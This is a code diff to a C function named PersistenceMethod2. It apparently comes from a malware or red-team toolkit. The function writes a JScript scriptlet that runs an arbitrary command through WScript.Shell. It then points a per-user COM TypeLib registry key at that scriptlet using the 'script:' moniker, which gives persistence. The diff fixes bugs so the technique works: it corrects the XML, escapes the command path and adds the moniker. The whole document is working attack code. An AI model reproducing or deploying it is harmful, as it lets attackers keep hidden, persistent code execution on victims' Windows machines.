@@ -243,10 +243,12 @@ BOOL PersistenceMethod2
 	HKEY hWin32 = NULL;
 	HKEY hZero = NULL;
 	BOOL Result = FALSE;
-	CHAR szTemplate[] = "<?xml version=\"1.0\"?>\n<scriptlet>\n    <Registration\n        description=\"For Fun\"\n        progid=\"FORFUN\"\n        version=\"1.0\"\n    </Registration>\n    <script language=\"JScript\">\n        <![CDATA[\n            var WShell = new ActiveXObject(\"WScript.Shell\");\n            WShell.Run(\"%s\");\n        ]]>\n    </script>\n</scriptlet>";
+	CHAR szTemplate[] = "<?xml version=\"1.0\"?>\n<scriptlet>\n    <registration\n        description=\"For Fun\"\n        progid=\"FORFUN\"\n        version=\"1.0\">\n    </registration>\n    <script language=\"JScript\">\n        <![CDATA[\n            var WShell = new ActiveXObject(\"WScript.Shell\");\n            WShell.Run(\"%s\");\n        ]]>\n    </script>\n</scriptlet>";
 	LPSTR lpSctContent = NULL;
 	LPSTR lpSctPath = NULL;
+	LPSTR lpDefaultValue = NULL;
 	LPWSTR lpTempPath = NULL;
+	LPSTR lpReformatedCommand = NULL;
 
 	Status = RegOpenKeyExA(HKEY_CURRENT_USER, szTypeLibPath, 0, KEY_READ, &hKey);
 	if (Status != ERROR_PATH_NOT_FOUND && Status != ERROR_FILE_NOT_FOUND) {
@@ -285,21 +287,28 @@ BOOL PersistenceMethod2
 		goto CLEANUP;
 	}
 
+	lpReformatedCommand = StrReplaceA(lpCommandLine, "\\", "\\\\", TRUE, 0);
+	if (lpReformatedCommand == NULL) {
+		goto CLEANUP;
+	}
+
 	lstrcatA(lpSctPath, "\\log.sct");
-	lpSctContent = ALLOC(lstrlenA(szTemplate) + lstrlenA(lpCommandLine));
-	wsprintfA(lpSctContent, szTemplate, lpCommandLine);
+	lpSctContent = ALLOC(lstrlenA(szTemplate) + lstrlenA(lpReformatedCommand));
+	wsprintfA(lpSctContent, szTemplate, lpReformatedCommand);
 	lpTempPath = ConvertCharToWchar(lpSctPath);
 	if (!WriteToFile(lpTempPath, lpSctContent, lstrlenA(lpSctContent))) {
 		goto CLEANUP;
 	}
 
-	Status = RegSetValueA(hWin64, NULL, REG_SZ, lpSctPath, lstrlenA(lpSctPath));
+	lpDefaultValue = DuplicateStrA("script:", lstrlenA(lpSctPath));
+	lstrcatA(lpDefaultValue, lpSctPath);
+	Status = RegSetValueA(hWin64, NULL, REG_SZ, lpDefaultValue, lstrlenA(lpSctPath));
 	if (Status != ERROR_SUCCESS) {
 		LOG_ERROR("RegSetValueA", Status);
 		goto CLEANUP;
 	}
 
-	Status = RegSetValueA(hWin32, NULL, REG_SZ, lpSctPath, lstrlenA(lpSctPath));
+	Status = RegSetValueA(hWin32, NULL, REG_SZ, lpDefaultValue, lstrlenA(lpSctPath));
 	if (Status != ERROR_SUCCESS) {
 		LOG_ERROR("RegSetValueA", Status);
 		goto CLEANUP;
@@ -331,8 +340,16 @@ CLEANUP:
 		FREE(lpTempPath);
 	}
 
+	if (lpDefaultValue != NULL) {
+		FREE(lpDefaultValue);
+	}
+
 	if (lpSctContent != NULL) {
 		FREE(lpSctContent);
+	}
+
+	if (lpReformatedCommand != NULL) {
+		FREE(lpReformatedCommand);
 	}
 
 	return Result;
